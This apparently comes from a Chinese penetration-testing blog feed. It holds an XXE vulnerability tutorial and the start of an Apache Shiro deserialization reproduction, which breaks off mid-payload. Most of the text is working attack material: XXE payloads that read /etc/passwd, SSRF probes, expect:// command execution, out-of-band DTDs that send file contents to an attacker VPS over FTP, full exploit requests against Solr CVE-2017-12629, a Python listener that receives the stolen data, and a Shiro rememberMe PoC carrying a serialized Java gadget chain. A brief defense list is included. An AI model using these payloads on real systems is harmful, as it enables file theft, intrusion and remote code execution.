<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=1.0 encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE % poem [</span></span><br><span class="line"><span class="meta">      &lt;!ENTITY % a SYSTEM "http://www.test.com/outdtd.dtd"&gt; </span></span><br><span class="line"><span class="meta">      % a;]&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">poem</span>&gt;</span>&amp;xxe;<span class="tag">&lt;/<span class="name">poem</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>outdtd.dtd</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">&lt;!ELEMENT xxe<span class="built_in"> SYSTEM </span><span class="string">"file:///etc/passwd"</span>&gt;</span><br></pre></td></tr></table></figure>

<h4 id="XXE漏洞危害"><a href="#XXE漏洞危害" class="headerlink" title="XXE漏洞危害"></a>XXE漏洞危害</h4><h5 id="任意外部实体引用，获取文件内容"><a href="#任意外部实体引用，获取文件内容" class="headerlink" title="任意外部实体引用，获取文件内容"></a>任意外部实体引用，获取文件内容</h5><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE root [</span></span><br><span class="line"><span class="meta">     &lt;!ENTITY entity SYSTEM "flle://C:\Users\rugal\Desktop\test.txt"&gt;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span>&amp;entity;<span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h5 id="URL请求"><a href="#URL请求" class="headerlink" title="URL请求"></a>URL请求</h5><p>SSRF请求192.168.2.1:6379，测试内外端口是否开放</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE root [</span></span><br><span class="line"><span class="meta">     &lt;!ENTITY entity SYSTEM "http://192.168.2.1:6379"&gt;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span>&amp;entity;<span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h5 id="Dos拒绝服务"><a href="#Dos拒绝服务" class="headerlink" title="Dos拒绝服务"></a>Dos拒绝服务</h5><p><img src="//choge.top/2020/07/27/XXE漏洞/image-20200728194556055.png" alt="image-20200728194556055"></p>
<h5 id="远程代码执行"><a href="#远程代码执行" class="headerlink" title="远程代码执行"></a>远程代码执行</h5><p>利用条件：在php开启expect扩展前提下</p>
<figure class="highlight dts"><table><tr><td class="code"><pre><span class="line"><span class="params">&lt;!DOCTYPE root[&lt;!ENTITY cmd SYSTEM "expect://id"&gt;</span>  </span><br><span class="line"><span class="params">&lt;dir&gt;</span></span><br><span class="line"><span class="params">&lt;file&gt;</span><span class="variable">&amp;cmd</span>;<span class="params">&lt;/file&gt;</span> </span><br><span class="line"><span class="params">&lt;/dir&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="XXE漏洞发现"><a href="#XXE漏洞发现" class="headerlink" title="XXE漏洞发现"></a>XXE漏洞发现</h4><p>1.WebService服务</p>
<p>2.判断request的xml请求是否被解析</p>
<p> <img src="//choge.top/2020/07/27/XXE漏洞/image-20200728195425222.png" alt="image-20200728195425222"></p>
<h4 id="JAVA-XXE"><a href="#JAVA-XXE" class="headerlink" title="JAVA XXE"></a>JAVA XXE</h4><h5 id="XXE直接回显"><a href="#XXE直接回显" class="headerlink" title="XXE直接回显"></a>XXE直接回显</h5><p>上图为直接回显</p>
<h5 id="XXE间接回显"><a href="#XXE间接回显" class="headerlink" title="XXE间接回显"></a>XXE间接回显</h5><p>可以利用参数实体来获取回显数据</p>
<p>思路：</p>
<p>1 客户端发送 payload1 给 Web 服务器</p>
<p>2 Web 服务器向 VPS 获取恶意的 DTD，并执行文件读取 payload2</p>
<p>3 Web 服务器带着回显结果访问 VPS 上特定 FTP 或者 HTTP</p>
<p>4 白帽子通过 VPS 获得回显</p>
<p>客户端payload：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE root [&lt;!ENTITY % remote SYSTEM "http://vpsip/xml.dtd"&gt;%remote;]&gt;</span></span><br></pre></td></tr></table></figure>

<p>部分请求需要html实体编码如下，如为get请求一般为url编码</p>
<figure class="highlight crmsh"><table><tr><td class="code"><pre><span class="line">&amp;<span class="keyword">lt</span>;?<span class="keyword">xml</span> <span class="title">version</span>=&amp;quot;<span class="number">1.0</span>&amp;quot; <span class="attr">encoding=</span>&amp;quot;UTF-<span class="number">8</span>&amp;quot;?&amp;<span class="keyword">gt</span>;&amp;<span class="keyword">lt</span>;</span><br><span class="line">!DOCTYPE root [&amp;<span class="keyword">lt</span>;!ENTITY % remote SYSTEM %quot;http://vpsip/xml.dtd&amp;quot;&amp;<span class="keyword">gt</span>;%remote;]&amp;<span class="keyword">gt</span>;</span><br></pre></td></tr></table></figure>

<p> vps payloads即<code>http://vpsip/xml.dtd</code>的内容如下</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY payload<span class="built_in"> SYSTEM </span><span class="string">"file:///etc/passwd"</span>&gt;</span><br><span class="line">&lt;!ENTITY % int <span class="string">"&lt;!ENTITY % trick SYSTEM 'ftp://vps:21/%payload;'&gt;"</span>&gt; </span><br><span class="line">%int;</span><br><span class="line">%trick;</span><br></pre></td></tr></table></figure>

<p>vps基本使用html实体编码如下</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY payload<span class="built_in"> SYSTEM </span><span class="string">"file:///etc/passwd"</span>&gt;</span><br><span class="line">&lt;!ENTITY % int <span class="string">"&lt;!ENTITY &amp;#37; trick SYSTEM 'ftp://vps:21/%payload;'&gt;"</span>&gt; </span><br><span class="line">%int;</span><br><span class="line">%trick;</span><br></pre></td></tr></table></figure>

<h4 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h4><p>1.禁用外部实体</p>
<p>2.过滤和严重用户提交的xml数据</p>
<p>3.不允许xml中含有任何自己声明的dtd</p>
<h4 id="XXE实战"><a href="#XXE实战" class="headerlink" title="XXE实战"></a>XXE实战</h4><p>使用漏洞环境为</p>
<p>Solr XXE漏洞（CVE-2017-12629）</p>
<p>发送如下请求，访问ceye平台有回显，说明存在xxe</p>
<figure class="highlight llvm"><table><tr><td class="code"><pre><span class="line">GET /solr/demo/<span class="keyword">select</span>?q=<span class="symbol">%3</span>C<span class="symbol">%3</span>Fxml<span class="symbol">%20</span>version<span class="symbol">%3</span>D<span class="symbol">%221</span>.<span class="number">0</span><span class="symbol">%22</span><span class="symbol">%20</span>encoding<span class="symbol">%3</span>D<span class="symbol">%22</span>UTF<span class="number">-8</span><span class="symbol">%22</span><span class="symbol">%3</span>F<span class="symbol">%3</span>E<span class="symbol">%0</span>A<span class="symbol">%3</span>C<span class="title">!DOCTYPE</span><span class="symbol">%20</span>root<span class="symbol">%20</span><span class="symbol">%5</span>B<span class="symbol">%0</span>A<span class="symbol">%3</span>C<span class="title">!ENTITY</span><span class="symbol">%20</span><span class="symbol">%25</span><span class="symbol">%20</span>remote<span class="symbol">%20</span>SYSTEM<span class="symbol">%20</span><span class="symbol">%22</span>http<span class="symbol">%3</span>A<span class="symbol">%2</span>F<span class="symbol">%2</span>Fxxxxxx.ceye.io<span class="symbol">%22</span><span class="symbol">%3</span>E<span class="symbol">%0</span>A<span class="symbol">%25</span>remote<span class="symbol">%3</span>B<span class="symbol">%5</span>D<span class="symbol">%3</span>E<span class="symbol">%0</span>A<span class="symbol">%3</span>Croot<span class="symbol">%2</span>F<span class="symbol">%3</span>E&amp;wt=xml&amp;defType=xmlparser HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">127.0</span>.<span class="number">0.1</span>:<span class="number">8983</span></span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Macintosh<span class="comment">; Intel Mac OS X 10.15; rv:77.0) Gecko/20100101 Firefox/77.0</span></span><br><span class="line"><span class="comment">Accept: application/json, text/plain, */*</span></span><br><span class="line"><span class="comment">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span></span><br><span class="line"><span class="comment">Accept-Encoding: gzip, deflate</span></span><br><span class="line"><span class="comment">Connection: close</span></span><br><span class="line"><span class="comment">Referer: http://127.0.0.1:8983/solr/</span></span><br></pre></td></tr></table></figure>

<p><img src="//choge.top/2020/07/27/XXE漏洞/image-20200728231413726.png" alt="image-20200728231413726"></p>
<p>url解码如下</p>
<p><img src="//choge.top/2020/07/27/XXE漏洞/image-20200729111625500.png" alt="image-20200729111625500"></p>
<p>使用工具<a href="https://github.com/ONsec-Lab/scripts/blob/master/xxe-ftp-server.rb在vps上架设ftp`ruby" target="_blank" rel="noopener">https://github.com/ONsec-Lab/scripts/blob/master/xxe-ftp-server.rb在vps上架设ftp`ruby</a> xxe-ftp-server.rb`</p>
<p>客户端发送请求如下</p>
<figure class="highlight xquery"><table><tr><td class="code"><pre><span class="line">GET /solr/demo/select?q=<span class="meta">%3C</span>?xml<span class="meta">%20version</span>=<span class="meta">%221</span>.<span class="number">0</span><span class="meta">%22</span><span class="meta">%20encoding</span>=<span class="meta">%22UTF-8</span><span class="meta">%22</span>?<span class="meta">%3E</span><span class="meta">%0A</span><span class="meta">%3C</span><span class="meta">%21DOCTYPE</span><span class="meta">%20cat</span><span class="meta">%20</span><span class="meta">%5B</span><span class="meta">%0A</span><span class="meta">%3C</span><span class="meta">%21ENTITY</span><span class="meta">%20</span><span class="meta">%25</span><span class="meta">%20file</span><span class="meta">%20SYSTEM</span><span class="meta">%20</span><span class="meta">%22file:</span>///etc/passwd<span class="meta">%22</span><span class="meta">%3E</span><span class="meta">%0A</span><span class="meta">%3C</span><span class="meta">%21ENTITY</span><span class="meta">%20</span><span class="meta">%25</span><span class="meta">%20dtd</span><span class="meta">%20SYSTEM</span><span class="meta">%20</span><span class="meta">%22http:</span>//vpsip/xml.dtd<span class="meta">%22</span><span class="meta">%3E</span><span class="meta">%0A</span><span class="meta">%25dtd</span>;<span class="meta">%0A</span><span class="meta">%25send</span>;<span class="meta">%0A</span><span class="meta">%5D</span><span class="meta">%3E</span>&amp;wt=xml&amp;defType=xmlparser HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">127.0</span>.<span class="number">0</span>.<span class="number">1</span>:<span class="number">8983</span></span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Macintosh; Intel Mac OS X <span class="number">10.15</span>; rv:<span class="number">77.0</span>) Gecko/<span class="number">20100101</span> Firefox/<span class="number">77.0</span></span><br><span class="line">Accept: application/json, <span class="type">text</span>/plain, */*</span><br><span class="line">Accept-Language: zh-CN,zh;q=<span class="number">0</span>.<span class="number">8</span>,zh-TW;q=<span class="number">0</span>.<span class="number">7</span>,zh-HK;q=<span class="number">0</span>.<span class="number">5</span>,en-US;q=<span class="number">0</span>.<span class="number">3</span>,en;q=<span class="number">0</span>.<span class="number">2</span></span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Referer: http://<span class="number">127.0</span>.<span class="number">0</span>.<span class="number">1</span>:<span class="number">8983</span>/solr/</span><br></pre></td></tr></table></figure>

<p><img src="//choge.top/2020/07/27/XXE漏洞/image-20200729113557700.png" alt="image-20200729113557700"></p>
<p>xml内容解码如下</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">&lt;?xml <span class="attribute">version</span>=<span class="string">"1.0"</span> <span class="attribute">encoding</span>=<span class="string">"UTF-8"</span>?&gt;</span><br><span class="line">&lt;!DOCTYPE cat [</span><br><span class="line">&lt;!ENTITY % file<span class="built_in"> SYSTEM </span><span class="string">"file:///etc/passwd"</span>&gt;</span><br><span class="line">&lt;!ENTITY % dtd<span class="built_in"> SYSTEM </span><span class="string">"http://vpsip/xml.dtd"</span>&gt;</span><br><span class="line">%dtd;</span><br><span class="line">%send;</span><br><span class="line">]&gt;&amp;<span class="attribute">wt</span>=xml&amp;defType=xmlparser</span><br></pre></td></tr></table></figure>

<p>服务器dtd代码：</p>
<figure class="highlight erlang-repl"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY <span class="comment">% cat "&lt;!ENTITY &amp;#x25; send SYSTEM 'ftp://vpsip:2121/%file;'&gt;"&gt;</span></span><br><span class="line"><span class="comment">%cat;</span></span><br></pre></td></tr></table></figure>

<p>vps显示如下</p>
<p><img src="//choge.top/2020/07/27/XXE漏洞/image-20200729113507476.png" alt="image-20200729113507476"></p>
<p>不在服务器设置dtd文件直接访问显示如下，可获取内网IP数据</p>
<p><img src="//choge.top/2020/07/27/XXE漏洞/image-20200801131628456.png" alt="image-20200801131628456"></p>
<p>使用python脚本获取数据</p>
<p>python脚本如下</p>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line">#!/usr/env/<span class="keyword">python</span></span><br><span class="line">from __future__ import print_function</span><br><span class="line">import socket</span><br><span class="line">s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">s.bind((<span class="string">'0.0.0.0'</span>,<span class="number">8821</span>))</span><br><span class="line">s.listen(<span class="number">1</span>)</span><br><span class="line"><span class="keyword">print</span>(<span class="string">'XXE-FTP listening'</span>)</span><br><span class="line"></span><br><span class="line">conn, addr = s.accept()</span><br><span class="line"><span class="keyword">print</span>(<span class="string">'Connected by %s'</span>,addr)</span><br><span class="line">conn.sendall(<span class="string">'220 Staal XXE-FTP\r\n'</span>)</span><br><span class="line"><span class="keyword">stop</span> = False</span><br><span class="line"><span class="keyword">while</span> not <span class="keyword">stop</span>:</span><br><span class="line">  <span class="keyword">dp</span> = str(conn.recv(<span class="number">1024</span>))</span><br><span class="line">  <span class="keyword">if</span> <span class="keyword">dp</span>.<span class="keyword">find</span>(<span class="string">"USER"</span>) &gt; -<span class="number">1</span>:</span><br><span class="line">    conn.sendall(<span class="string">"331 password please - version check\r\n"</span>)</span><br><span class="line">  <span class="keyword">else</span>:</span><br><span class="line">    conn.sendall(<span class="string">"230 more data please!\r\n"</span>)</span><br><span class="line">  <span class="keyword">if</span> <span class="keyword">dp</span>.<span class="keyword">find</span>(<span class="string">"RETR"</span>) == <span class="number">0</span> <span class="built_in">or</span> <span class="keyword">dp</span>.<span class="keyword">find</span>(<span class="string">"QUIT"</span>) == <span class="number">0</span>:</span><br><span class="line">    <span class="keyword">stop</span> = True</span><br><span class="line">  <span class="keyword">if</span> <span class="keyword">dp</span>.<span class="keyword">find</span>(<span class="string">"CWD"</span>) &gt; -<span class="number">1</span>:</span><br><span class="line">    <span class="keyword">print</span>(<span class="keyword">dp</span>.replace(<span class="string">'CWD'</span>,<span class="string">'/'</span>,<span class="number">1</span>).replace(<span class="string">'\r\n'</span>,<span class="string">''</span>),end=<span class="string">''</span>)</span><br><span class="line">  <span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">print</span>(<span class="keyword">dp</span>)</span><br><span class="line">conn.<span class="keyword">close</span>()</span><br><span class="line">s.<span class="keyword">close</span></span><br></pre></td></tr></table></figure>

<p>请求如下</p>
<figure class="highlight xquery"><table><tr><td class="code"><pre><span class="line">GET /solr/demo/select?q=<span class="meta">%3C</span>?xml<span class="meta">%20version</span>=<span class="meta">%221</span>.<span class="number">0</span><span class="meta">%22</span><span class="meta">%20encoding</span>=<span class="meta">%22utf-8</span><span class="meta">%22</span>?<span class="meta">%3E</span><span class="meta">%0A</span><span class="meta">%3C</span><span class="meta">%21DOCTYPE</span><span class="meta">%20root</span><span class="meta">%20</span><span class="meta">%5B</span><span class="meta">%3C</span><span class="meta">%21ENTITY</span><span class="meta">%20</span><span class="meta">%25</span><span class="meta">%20remote</span><span class="meta">%20SYSTEM</span><span class="meta">%20</span><span class="meta">%22http:</span>//vpsip/dtd.dtd<span class="meta">%22</span><span class="meta">%3E</span><span class="meta">%25remote</span>;<span class="meta">%5D</span><span class="meta">%3E</span><span class="meta">%0A</span>&amp;wt=xml&amp;defType=xmlparser HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">127.0</span>.<span class="number">0</span>.<span class="number">1</span>:<span class="number">8983</span></span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Macintosh; Intel Mac OS X <span class="number">10.15</span>; rv:<span class="number">78.0</span>) Gecko/<span class="number">20100101</span> Firefox/<span class="number">78.0</span></span><br><span class="line">Accept: application/json, <span class="type">text</span>/plain, */*</span><br><span class="line">Accept-Language: zh-CN,zh;q=<span class="number">0</span>.<span class="number">8</span>,zh-TW;q=<span class="number">0</span>.<span class="number">7</span>,zh-HK;q=<span class="number">0</span>.<span class="number">5</span>,en-US;q=<span class="number">0</span>.<span class="number">3</span>,en;q=<span class="number">0</span>.<span class="number">2</span></span><br><span class="line">Accept-Encoding: gzip, deflate</span><br></pre></td></tr></table></figure>

<p>返回数据如下</p>
<p><img src="//choge.top/2020/07/27/XXE漏洞/image-20200802094903759.png" alt="image-20200802094903759"></p>
<p>vps的dtd.dtd代码如下</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY payload<span class="built_in"> SYSTEM </span><span class="string">"file:///etc/passwd"</span>&gt;</span><br><span class="line">&lt;!ENTITY % int <span class="string">"&lt;!ENTITY &amp;#37; trick SYSTEM 'ftp://vps:8821/%payload;'&gt;"</span>&gt; </span><br><span class="line">%int;</span><br><span class="line">%trick;</span><br></pre></td></tr></table></figure>

<p>以上显示存在问题，只能显示一行，再次尝试对solr服务器写入333文件，内容为i love u，尝试可成功读取，如下</p>
<p><img src="//choge.top/2020/07/27/XXE漏洞/image-20200802104353402.png" alt="image-20200802104353402"></p>
<h4 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h4><p><a href="https://blog.csdn.net/u011721501/article/details/43775691" target="_blank" rel="noopener">https://blog.csdn.net/u011721501/article/details/43775691</a></p>
<p><a href="https://blog.csdn.net/nzjdsds/article/details/98763063" target="_blank" rel="noopener">https://blog.csdn.net/nzjdsds/article/details/98763063</a></p>
<p><a href="https://www.cnblogs.com/17bdw/p/10098181.html" target="_blank" rel="noopener">https://www.cnblogs.com/17bdw/p/10098181.html</a></p>
<p><a href="https://www.evi1s.com/archives/88/" target="_blank" rel="noopener">https://www.evi1s.com/archives/88/</a></p>
<p><a href="https://xz.aliyun.com/t/2249" target="_blank" rel="noopener">https://xz.aliyun.com/t/2249</a></p>
<p><a href="https://xz.aliyun.com/t/122" target="_blank" rel="noopener">https://xz.aliyun.com/t/122</a></p>
<p><a href="https://www.cnblogs.com/zpchcbd/p/12900903.html" target="_blank" rel="noopener">https://www.cnblogs.com/zpchcbd/p/12900903.html</a></p>
<p><a href="https://blog.csdn.net/csacs/article/details/88220227" target="_blank" rel="noopener">https://blog.csdn.net/csacs/article/details/88220227</a></p>
]]></content>
      <categories>
        <category>Penetration test</category>
      </categories>
      <tags>
        <tag>xxe</tag>
      </tags>
  </entry>
  <entry>
    <title>Shiro反序列化漏洞复现</title>
    <url>/2020/07/27/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<h3 id="Shiro反序列化漏洞复现"><a href="#Shiro反序列化漏洞复现" class="headerlink" title="Shiro反序列化漏洞复现"></a>Shiro反序列化漏洞复现</h3><h4 id="Linux环境"><a href="#Linux环境" class="headerlink" title="Linux环境"></a>Linux环境</h4><p>返回包有如下字段确认为Shiro</p><p><img src="//choge.top/2020/07/27/Shiro反序列化漏洞复现/image-20200728085154298.png" alt="image-20200728085154298"></p><p>dnslog 平台：<a href="http://www.dnslog.cn/" target="_blank" rel="noopener">http://www.dnslog.cn/</a> 或<a href="http://ceye.io/盲测漏洞" target="_blank" rel="noopener">http://ceye.io/盲测漏洞</a></p><p>也可以使用Python代码盲测漏洞是否存在</p><figure class="highlight dns"><table><tr><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># coding:utf-<span class="number">8</span></span><br><span class="line"></span><br><span class="line">import time</span><br><span class="line">import base64</span><br><span class="line">import uuid</span><br><span class="line">import requests</span><br><span class="line">import random</span><br><span class="line">import binascii</span><br><span class="line">from Crypto.Cipher import AES</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def poc(url):</span><br><span class="line">    if '://' not in url:</span><br><span class="line">        target = 'https://%s' % url if ':<span class="number">443</span>' in url else 'http://%s' % url</span><br><span class="line">    else:</span><br><span class="line">        target = url</span><br><span class="line">    try:</span><br><span class="line">        numint = random.randint(<span class="number">1000</span>, <span class="number">9999</span>)</span><br><span class="line">        payload = generator(numint)</span><br><span class="line">        requests.get(target, cookies=&#123;'rememberMe': payload.decode()&#125;, timeout=<span class="number">10</span>)</span><br><span class="line">        time.sleep(<span class="number">3</span>)</span><br><span class="line">        resp = requests.get("http://admin.dnslog.link/api/dns/test/test/")</span><br><span class="line">        if "%s.shiro" % (str(numint)) in resp.content:</span><br><span class="line">            print "[+] %s is vulnerable." % (url)</span><br><span class="line">            return True</span><br><span class="line">    except:</span><br><span class="line">        pass</span><br><span class="line">    return False</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def generator(numint):</span><br><span class="line">    payload = "ACED00<span class="number">05 73720017</span> <span class="number">6A617661</span> <span class="number">2E757469</span> <span class="number">6C2E5072</span> <span class="number">696F7269</span> <span class="number">74795175</span> <span class="number">65756594</span> DA30B4FB <span class="number">3F82B103</span> <span class="number">00024900</span> <span class="number">0473697</span><span class="keyword">A</span> <span class="number">654</span>C000A <span class="number">636F6D70</span> <span class="number">61726174</span> <span class="number">6F727400</span> <span class="number">164C6A61</span> <span class="number">76612F75</span> <span class="number">74696</span>C2F <span class="number">436F6D70</span> <span class="number">61726174</span> <span class="number">6F723B78</span> <span class="number">70000000</span> <span class="number">02737200</span> <span class="number">426F7267</span> <span class="number">2E617061</span> <span class="number">6368652</span>E <span class="number">636</span>F6D6D <span class="number">6</span>F6E732E <span class="number">636</span>F6C6C <span class="number">65637469</span> <span class="number">6F6E7334</span> <span class="number">2</span>E636F6D <span class="number">70617261</span> <span class="number">746F7273</span> <span class="number">2E547261</span> <span class="number">6</span>E73666F <span class="number">726</span>D696E <span class="number">67436</span>F6D <span class="number">70617261</span> <span class="number">746</span>F722F F984F02B B108CC<span class="number">02 00024C00</span> <span class="number">09646563</span> <span class="number">6F726174</span> <span class="number">65647100</span> <span class="number">7</span>E00014C <span class="number">000B7472</span> <span class="number">616E7366</span> <span class="number">6F726D65</span> <span class="number">7274002</span>D <span class="number">4C6F7267</span> <span class="number">2F617061</span> <span class="number">6368652</span>F <span class="number">636</span>F6D6D <span class="number">6</span>F6E732F <span class="number">636</span>F6C6C <span class="number">65637469</span> <span class="number">6F6E7334</span> <span class="number">2F547261</span> <span class="number">6</span>E73666F <span class="number">726D6572</span> <span class="number">3B787073</span> <span class="number">7200406</span>F <span class="number">72672E61</span> <span class="number">70616368</span> <span class="number">652</span>E636F <span class="number">6</span>D6D6F6E <span class="number">732</span>E636F <span class="number">6C6C6563</span> <span class="number">74696</span>F6E <span class="number">73342E63</span> <span class="number">6F6D7061</span> <span class="number">7261746</span>F <span class="number">72732E43</span> <span class="number">6F6D7061</span> <span class="number">7261626</span>C <span class="number">65436</span>F6D <span class="number">70617261</span> <span class="number">746</span>F72FB F<span class="number">49925B8</span> <span class="number">6</span>EB137<span class="number">02 00007870</span> <span class="number">7372003</span>B <span class="number">6</span>F72672E <span class="number">61706163</span> <span class="number">68652E63</span> <span class="number">6</span>F6D6D6F <span class="number">6E732E63</span> <span class="number">6F6C6C65</span> <span class="number">6374696</span>F <span class="number">6</span>E73342E <span class="number">66756E63</span> <span class="number">746F7273</span> <span class="number">2E496E76</span> <span class="number">6F6B6572</span> <span class="number">5472616</span>E <span class="number">73666F72</span> <span class="number">6D657287</span> E8FF6B7B <span class="number">7</span>CCE38<span class="number">02 00035B00</span> <span class="number">05694172</span> <span class="number">67737400</span> <span class="number">135</span>B4C6A <span class="number">6176612</span>F <span class="number">6C616E67</span> <span class="number">2</span>F4F626A <span class="number">6563743</span>B <span class="number">4C000B69</span> <span class="number">4D657468</span> <span class="number">6F644E61</span> <span class="number">6D657400</span> <span class="number">124C6A61</span> <span class="number">76612</span>F6C <span class="number">616</span>E672F <span class="number">53747269</span> <span class="number">6</span>E673B5B <span class="number">000B6950</span> <span class="number">6172616</span>D <span class="number">54797065</span> <span class="number">73740012</span> <span class="number">5B4C6A61</span> <span class="number">76612</span>F6C <span class="number">616</span>E672F <span class="number">436C6173</span> <span class="number">733B7870</span> <span class="number">75720013</span> <span class="number">5B4C6A61</span> <span class="number">76612</span>E6C <span class="number">616</span>E672E <span class="number">4F626A65</span> <span class="number">63743B90</span> CE589F<span class="number">10 73296C02</span> <span class="number">00007870</span> <span class="number">00000000</span> <span class="number">74000</span>E6E <span class="number">65775472</span> <span class="number">616E7366</span> <span class="number">6F726D65</span> <span class="number">72757200</span> <span class="number">125</span>B4C6A <span class="number">6176612</span>E <span class="number">6C616E67</span> <span class="number">2E436C61</span> <span class="number">73733</span>BAB <span class="number">16</span>D7AECB CD5A99<span class="number">02 00007870</span> <span class="number">00000000</span> <span class="number">77040000</span> <span class="number">00037372</span> <span class="number">003</span>A636F <span class="number">6D2E7375</span> <span class="number">6E2E6F72</span> <span class="number">672E6170</span> <span class="number">61636865</span> <span class="number">2</span>E78616C <span class="number">616E2E69</span> <span class="number">6E746572</span> <span class="number">6</span>E616C2E <span class="number">78736C74</span> <span class="number">632E7472</span> <span class="number">61782E54</span> <span class="number">656</span>D706C <span class="number">61746573</span> <span class="number">496</span>D706C <span class="number">09574</span>FC1 <span class="number">6</span>EACAB<span class="number">33 03000949</span> <span class="number">000D5F69</span> <span class="number">6</span>E64656E <span class="number">744</span>E756D <span class="number">62657249</span> <span class="number">000E5F74</span> <span class="number">72616E73</span> <span class="number">6C657449</span> <span class="number">6E646578</span> <span class="number">5</span>A00155F <span class="number">75736553</span> <span class="number">65727669</span> <span class="number">6365734</span>D <span class="number">65636861</span> <span class="number">6</span>E69736D <span class="number">4</span>C00195F <span class="number">61636365</span> <span class="number">73734578</span> <span class="number">7465726</span>E <span class="number">616C5374</span> <span class="number">796C6573</span> <span class="number">68656574</span> <span class="number">71007E00</span> <span class="number">0</span>A4C000B <span class="number">5F617578</span> <span class="number">436C6173</span> <span class="number">73657374</span> <span class="number">003B4C63</span> <span class="number">6F6D2F73</span> <span class="number">756</span>E2F6F <span class="number">72672F61</span> <span class="number">70616368</span> <span class="number">652F7861</span> <span class="number">6</span>C616E2F <span class="number">696E7465</span> <span class="number">726</span>E616C <span class="number">2</span>F78736C <span class="number">74632F72</span> <span class="number">756E7469</span> <span class="number">6D652F48</span> <span class="number">61736874</span> <span class="number">61626C65</span> <span class="number">3</span>B5B000A <span class="number">5F627974</span> <span class="number">65636F64</span> <span class="number">65737400</span> <span class="number">035B5B42</span> <span class="number">5</span>B00065F <span class="number">636C6173</span> <span class="number">7371007</span>E <span class="number">000B4C00</span> <span class="number">055F6E61</span> <span class="number">6D657100</span> <span class="number">7</span>E000A4C <span class="number">00115</span>F6F <span class="number">75747075</span> <span class="number">7450726</span>F <span class="number">70657274</span> <span class="number">69657374</span> <span class="number">00164</span>C6A <span class="number">6176612</span>F <span class="number">7574696</span>C <span class="number">2</span>F50726F <span class="number">70657274</span> <span class="number">6965733</span>B <span class="number">78700000</span> <span class="number">0000</span>FFFF FFFF0074 <span class="number">0003616</span>C <span class="number">6C707572</span> <span class="number">00035</span>B5B <span class="number">424</span>BFD19 <span class="number">156767</span>DB <span class="number">37020000</span> <span class="number">78700000</span> <span class="number">00027572</span> <span class="number">00025B42</span> ACF317F8 <span class="number">060854E0</span> <span class="number">02000078</span> <span class="number">70000006</span> A2CAFEBA BE000000 <span class="number">3100380</span><span class="keyword">A</span> <span class="number">00030022</span> <span class="number">07003607</span> <span class="number">00250700</span> <span class="number">26010010</span> <span class="number">73657269</span> <span class="number">616C5665</span> <span class="number">7273696</span>F <span class="number">6E554944</span> <span class="number">0100014</span><span class="keyword">A</span> <span class="number">01000D43</span> <span class="number">6F6E7374</span> <span class="number">616E7456</span> <span class="number">616C7565</span> <span class="number">05</span>AD2093 F391DDEF <span class="number">3E010006</span> <span class="number">3C696E69</span> <span class="number">743E0100</span> <span class="number">03282956</span> <span class="number">01000443</span> <span class="number">6F646501</span> <span class="number">000F4C69</span> <span class="number">6E654E75</span> <span class="number">6D626572</span> <span class="number">5461626</span>C <span class="number">65010012</span> <span class="number">4C6F6361</span> <span class="number">6C566172</span> <span class="number">6961626</span>C <span class="number">65546162</span> <span class="number">6C650100</span> <span class="number">04746869</span> <span class="number">73010013</span> <span class="number">53747562</span> <span class="number">5472616</span>E <span class="number">736C6574</span> <span class="number">5061796</span>C <span class="number">6F616401</span> <span class="number">000</span>C496E <span class="number">6E657243</span> <span class="number">6C617373</span> <span class="number">65730100</span> <span class="number">354C7973</span> <span class="number">6F736572</span> <span class="number">69616</span>C2F <span class="number">7061796</span>C <span class="number">6F616473</span> <span class="number">2F757469</span> <span class="number">6C2F4761</span> <span class="number">64676574</span> <span class="number">73245374</span> <span class="number">75625472</span> <span class="number">616</span>E736C <span class="number">65745061</span> <span class="number">796C6F61</span> <span class="number">643B0100</span> <span class="number">09747261</span> <span class="number">6</span>E73666F 